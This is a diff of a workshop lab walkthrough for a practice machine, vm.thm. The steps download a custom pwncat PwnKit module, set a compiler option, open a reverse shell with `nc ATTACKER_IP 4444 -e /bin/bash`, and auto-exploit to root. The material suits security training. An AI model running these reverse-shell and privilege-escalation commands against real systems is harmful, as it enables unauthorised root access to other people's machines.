@@ -129,11 +129,12 @@ Remember when we uploaded linpeas to the target and then downloaded the recon.tx
 
 1. Download my pwnkit.py custom module: `curl -Ls https://raw.githubusercontent.com/DanaEpp/pwncat_pwnkit/main/pwnkit.py -O`
 2. Move `pwnkit.py` to `~/.local/share/pwncat/modules/`. You may need to create this directory if it doesn't exist
-3. Start a new pwncat listener: `pwncat-cs -lp 4444`
-4. From your SSH session on vm.thm, fire a new reverse shell: `nc ATTACKER_IP 4444 -e /bin/bash`
-5. Confirm the pwnkit module automatically loaded using `info pwnkit`. If loaded, it should provide a description of what the module does.
-6. Now auto-exploit to privesc to root. Simply type: `run pwnkit`. If successful, your UID should now be zero.
-7. Confirm by going into remote-mode and doing `whoami`. You should now be root. Pwnage!
+3. Update `~/.local/share/pwncat/pwncatrc` with the following line: `set cross "/usr/bin/gcc"`
+4. Start a new pwncat listener: `pwncat-cs -lp 4444`
+5. From your SSH session on vm.thm, fire a new reverse shell: `nc ATTACKER_IP 4444 -e /bin/bash`
+6. Confirm the pwnkit module automatically loaded using `info pwnkit`. If loaded, it should provide a description of what the module does.
+7. Now auto-exploit to privesc to root. Simply type: `run pwnkit`. If successful, your UID should now be zero.
+8. Confirm by going into remote-mode and doing `whoami`. You should now be root. Pwnage!
 
 So follow along with me as I walk you through the code in VS Code. (That means stop reading and listen to me in the workshop :-) )
 
